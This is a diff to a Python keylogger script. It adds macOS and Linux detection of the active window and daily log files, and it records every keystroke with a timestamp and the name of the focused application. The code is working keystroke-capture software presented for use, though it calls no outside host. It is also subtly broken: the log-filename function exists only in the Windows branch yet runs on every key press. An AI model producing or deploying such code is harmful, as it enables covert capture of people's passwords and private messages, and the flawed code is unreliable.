@@ -1,9 +1,9 @@
 from pynput import keyboard
 import datetime
+import os
 import platform
 
-# [OS detection code remains the same...]
-
+# Detect OS and import appropriate libraries
 if platform.system() == "Windows":
     import win32gui
     import win32process
@@ -20,30 +20,82 @@ if platform.system() == "Windows":
         except:
             return "Unknown"
 
+
+    def get_log_filename():
+        """Generate log filename based on current date"""
+        date_str = datetime.datetime.now().strftime("%Y-%m-%d")
+        return os.path.join(log_directory, f"keylog_{date_str}.txt")
+
+elif platform.system() == "Darwin":
+    # noinspection PyUnresolvedReferences
+    from AppKit import NSWorkspace
+
+
+    def get_active_window():
+        try:
+            active_app = NSWorkspace.sharedWorkspace().activeApplication()
+            return f"{active_app['NSApplicationName']}"
+        except:
+            return "Unknown"
+
+elif platform.system() == "Linux":
+    import subprocess
+
+
+    def get_active_window():
+        try:
+            window_id = subprocess.check_output(['xdotool', 'getactivewindow']).decode().strip()
+            window_name = subprocess.check_output(['xdotool', 'getwindowname', window_id]).decode().strip()
+            return window_name
+        except:
+            return "Unknown"
+
+# Configuration
+log_directory = "keylogs"
 log_file = "keylog.txt"
 current_window = ""
+current_log_file = ""
 
+if not os.path.exists(log_directory):
+    os.makedirs(log_directory)
 
 def on_press(key):
-    global current_window
+    global current_window, current_log_file
 
+    # Get the log file for today
+    log_file = get_log_filename()
+
+    # Check if we've switched to a new day's log file
+    if log_file != current_log_file:
+        current_log_file = log_file
+        with open(log_file, "a", encoding="utf-8") as f:  # FIXED
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            f.write(f"\n{'=' * 60}\n")
+            f.write(f"[{timestamp}] NEW SESSION STARTED\n")
+            f.write(f"{'=' * 60}\n")
+
+    # Get current active window
     active_window = get_active_window()
 
+    # Log window change
     if active_window != current_window:
         current_window = active_window
-        with open(log_file, "a", encoding="utf-8") as f:  # Added encoding
+        with open(log_file, "a", encoding="utf-8") as f:  # FIXED
             timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             f.write(f"\n{'=' * 60}\n")
             f.write(f"[{timestamp}] APPLICATION: {current_window}\n")
             f.write(f"{'=' * 60}\n")
 
+    # Log keystroke with timestamp
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     try:
-        with open(log_file, "a", encoding="utf-8") as f:  # Added encoding
+        # Regular character keys
+        with open(log_file, "a", encoding="utf-8") as f:  # FIXED
             f.write(f"[{timestamp}] {key.char}\n")
     except AttributeError:
-        with open(log_file, "a", encoding="utf-8") as f:  # Added encoding
+        # Special keys
+        with open(log_file, "a", encoding="utf-8") as f:  # FIXED
             if key == keyboard.Key.space:
                 f.write(f"[{timestamp}] [SPACE]\n")
             elif key == keyboard.Key.enter:
@@ -56,6 +108,7 @@ def on_press(key):
                 f.write(f"[{timestamp}] {key}\n")
 
 
+# Start the listener
 print("Keylogger started. Press Ctrl+C to stop.")
 print(f"Logging to: {log_file}")
 
